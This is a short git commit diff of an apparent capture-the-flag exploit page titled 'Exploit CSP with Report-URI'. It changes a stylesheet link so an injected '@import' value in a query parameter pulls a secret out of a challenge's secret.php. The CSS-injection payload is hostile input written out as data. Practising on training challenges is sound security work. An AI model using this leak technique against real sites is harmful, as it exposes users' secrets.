df26482db5ef384b946e4e39e84069b4d35cdee0
tadokun468 <huynhluc258@gmail.com>
2024-12-03 22:08:42 +0700

    abcd

--- src/index.php
+++ src/index.php
@@ -11,7 +11,7 @@ header("Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Exploit CSP with Report-URI</title>
     <!-- Tải file CSS chứa nội dung `$secret` -->
-    <link rel="stylesheet" href="http://host3.dreamhack.games:15346/secret.php?whatUwant=@import '">
+    <link rel="stylesheet" href="https://training-70et.onrender.com/secret.php?whatUwant=@import '">
 </head>
 <body>
     <h1>Exploitation in Progress...</h1>
